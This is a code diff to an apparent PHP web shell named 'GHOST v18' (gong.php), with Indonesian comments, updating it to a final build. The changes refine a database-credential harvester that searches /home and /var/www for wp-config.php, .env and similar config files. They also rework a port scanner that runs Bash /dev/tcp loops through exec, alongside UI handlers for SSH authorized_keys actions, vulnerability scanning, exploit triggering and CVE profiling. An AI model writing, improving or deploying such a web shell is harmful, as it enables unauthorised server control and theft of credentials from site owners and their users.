@@ -2,7 +2,7 @@
 // language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
 // GHOST v18 - section 0..6: Full UI, Fix JSON, Advanced DB, Deep Scan.
 
-define('GH_VER',      '18.0.0-s6-fix');
+define('GH_VER',      '18.0.0-final');
 define('GH_TAG',      'gong');
 define('GH_STATE_DIR', gh_state_dir());
 define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');
@@ -282,11 +282,11 @@ function gh_vuln_scan() {
 
 // ==== SECTION 4: ADVANCED DB HARVEST & SSH ==================================
 function gh_db_harvest() {
-    $logs = array(); $info = array(); $root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd();
+    $logs = array(); $info = array();
     
-    // 1. Cari pake exec find (jauh lebih cepat & dalam, ke seluruh server)
     $logs[] = "[*] Scanning config via find (seluruh server)...";
-    $find_res = gh_exec_adv("find /home /var/www /var/www/html -maxdepth 4 -type f \\( -name 'wp-config.php' -o -name 'configuration.php' -o -name '.env' -o -name 'database.php' -o -name 'settings.php' -o -name 'config.php' \\) 2>/dev/null");
+    // Scan /home dan /var/www untuk config
+    $find_res = gh_exec_adv("find /home /var/www -maxdepth 4 -type f \\( -name 'wp-config.php' -o -name 'configuration.php' -o -name '.env' -o -name 'database.php' -o -name 'settings.php' -o -name 'config.php' -o -name 'db.php' \\) 2>/dev/null");
     
     $found_configs = array();
     if (isset($find_res['out']) && is_string($find_res['out'])) {
@@ -295,7 +295,8 @@ function gh_db_harvest() {
     }
     
     if (empty($found_configs)) {
-        $logs[] = "[-] find gagal/kosong, fallback ke recursive scandir di webroot...";
+        $logs[] = "[-] find gagal, fallback ke recursive scandir di webroot...";
+        $root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : @getcwd();
         $stack = array($root);
         while ($stack) {
             $current = array_pop($stack);
@@ -397,22 +398,25 @@ function gh_ssh_action($action, $key) {
 }
 
 // ==== SECTION 5: PORT SCAN (FIXED) & CVE PROFILER ===========================
-function gh_port_scan($target = '127.0.0.1', $ports = null, $timeout = 0.3) {
-    if (!$ports) {
-        $ports = array(21, 22, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 2082, 2083, 2086, 2087, 3306, 5432, 6379, 8080, 8443, 27017);
-    }
-    $open = array();
+function gh_port_scan($target = '127.0.0.1') {
+    $ports = array(21, 22, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 2082, 2083, 2086, 2087, 3306, 5432, 6379, 8080, 8443, 27017);
+    $port_str = implode(' ', $ports);
+    
+    // Trik Port Scan paling cepat & aman: pakai Bash /dev/tcp via exec
+    $bash_script = '';
     foreach ($ports as $p) {
-        // GUNAKAN stream_socket_client, JANGAN fsockopen. Error di-suppress total.
-        $errno = 0; $errstr = '';
-        $fp = @stream_socket_client("tcp://$target:$p", $errno, $errstr, $timeout, STREAM_CLIENT_CONNECT);
-        if ($fp !== false && is_resource($fp)) {
-            $banner = '';
-            @stream_set_timeout($fp, 1);
-            $banner = @fread($fp, 1024);
-            if ($banner === false) $banner = '';
-            @fclose($fp);
-            $open[] = array('port' => $p, 'banner' => substr(trim($banner), 0, 100));
+        $bash_script .= " (echo > /dev/tcp/$target/$p) >/dev/null 2>&1 && echo \"$p\";";
+    }
+    
+    $res = gh_exec_adv($bash_script, 8);
+    $open = array();
+    if (isset($res['out']) && is_string($res['out'])) {
+        $lines = explode("\n", trim($res['out']));
+        foreach ($lines as $l) {
+            $l = trim($l);
+            if (is_numeric($l)) {
+                $open[] = array('port' => (int)$l, 'banner' => '');
+            }
         }
     }
     return $open;
@@ -529,7 +533,7 @@ function gh_ui() {
 </head>
 <body>
 <div class="box">
-    <h2>GHOST v18 / Section 6</h2>
+    <h2>GHOST v18 / Final Build</h2>
     <div class="row">
         <span class="tag"><?= htmlspecialchars($env['php_version']) ?></span>
         <span class="tag"><?= htmlspecialchars($env['user']) ?></span>
@@ -639,7 +643,11 @@ async function api(act, data={}) {
     for (let k in data) body.append(k, data[k]);
     const r = await fetch(window.location.href, { method:'POST', body });
     const text = await r.text();
-    try { return JSON.parse(text); } catch(e) { return {err:'Invalid JSON: '+text.substring(0,100)}; }
+    try { 
+        return JSON.parse(text); 
+    } catch(e) { 
+        return {err:'RAW ERROR ('+r.status+'):\n'+text.substring(0,500)}; 
+    }
 }
 
 async function execCmd() {
@@ -693,12 +701,13 @@ function renderScan(mal) {
 async function dbHarvest() {
     const o = document.getElementById('db-out'); o.innerText = 'Scanning configs...';
     const d = await api('db_harvest');
+    if (d.err) return o.innerText = d.err;
     o.innerText = d.logs.join('\n');
 }
 async function sshScan() {
     const o = document.getElementById('ssh-out'); o.innerText = 'Scanning...';
     const d = await api('ssh_scan');
-    if (d.err) return o.innerText = 'Error: ' + d.err;
+    if (d.err) return o.innerText = d.err;
     let txt = d.logs.join('\n') + '\n\n';
     if (d.keys.length) {
         txt += '--- AUTHORIZED KEYS ---\n';
@@ -716,7 +725,7 @@ async function sshAct(act) {
 async function vulnScan() {
     const resDiv = document.getElementById('vuln-results'); resDiv.innerHTML = 'Scanning...';
     const d = await api('vuln_scan');
-    if (d.err) { resDiv.innerHTML = '<span class="err">Error: '+d.err+'</span>'; return; }
+    if (d.err) { resDiv.innerHTML = '<span class="err">'+d.err+'</span>'; return; }
     if (!d.length) { resDiv.innerHTML = '<p class="dim">No vulnerabilities found.</p>'; return; }
     let h = `<table><tr><th>Type</th><th>Path</th><th>Desc</th><th>Aksi</th></tr>`;
     d.forEach(v => {
@@ -734,18 +743,18 @@ async function exploit(t, encP) {
 
 async function portScan() {
     const t = document.getElementById('port-target').value.trim(); const o = document.getElementById('port-out');
-    o.innerText = 'Scanning ports on ' + t + '...';
+    o.innerText = 'Scanning ports on ' + t + ' via Bash/Exec...';
     const d = await api('port_scan', {target: t});
-    if (d.err) return o.innerText = 'Error: ' + d.err;
+    if (d.err) return o.innerText = d.err;
     if (!d.length) return o.innerText = 'No open ports found.';
     let txt = '--- OPEN PORTS ---\n';
-    d.forEach(p => txt += `[+] ${p.port}/tcp ${p.banner ? '('+p.banner+')' : ''}\n`);
+    d.forEach(p => txt += `[+] ${p.port}/tcp\n`);
     o.innerText = txt;
 }
 async function cveProfile() {
     const o = document.getElementById('cve-out'); o.innerText = 'Analyzing...';
     const d = await api('cve_profile');
-    if (d.err) return o.innerText = 'Error: ' + d.err;
+    if (d.err) return o.innerText = d.err;
     let txt = '<h3>Stack:</h3><ul>';
     d.stack.forEach(s => txt += `<li>${esc(s)}</li>`);
     txt += '</ul><h3>CVE:</h3>';
@@ -756,43 +765,6 @@ async function cveProfile() {
     } else { txt += '<p class="dim">Tidak ada CVE kritis yang cocok.</p>'; }
     o.innerHTML = txt;
 }
-    function switchTab(id, btn) {
-    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
-    document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
-    document.getElementById(id).classList.add('active');
-    btn.classList.add('active');
-}
-function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
-async function api(act, data={}) {
-    const body = new URLSearchParams(); body.append('act', act);
-    for (let k in data) body.append(k, data[k]);
-    const r = await fetch(window.location.href, { method:'POST', body });
-    const text = await r.text();
-    try { 
-        return JSON.parse(text); 
-    } catch(e) { 
-        return {err:'RAW RESPONSE (Cek kode HTTP '+r.status+'): \n\n' + text.substring(0, 500)}; 
-    }
-}
-
-async function portScan() {
-    const t = document.getElementById('port-target').value.trim(); const o = document.getElementById('port-out');
-    o.innerText = 'Scanning ports on ' + t + '...';
-    const d = await api('port_scan', {target: t});
-    if (d.err) return o.innerText = d.err;
-    if (!d.length) return o.innerText = 'No open ports found.';
-    let txt = '--- OPEN PORTS ---\n';
-    d.forEach(p => txt += `[+] ${p.port}/tcp ${p.banner ? '('+p.banner+')' : ''}\n`);
-    o.innerText = txt;
-}
-
-async function dbHarvest() {
-    const o = document.getElementById('db-out'); o.innerText = 'Scanning configs...';
-    const d = await api('db_harvest');
-    if (d.err) return o.innerText = d.err;
-    o.innerText = d.logs.join('\n');
-}
-
 </script>
 </body>
 </html>
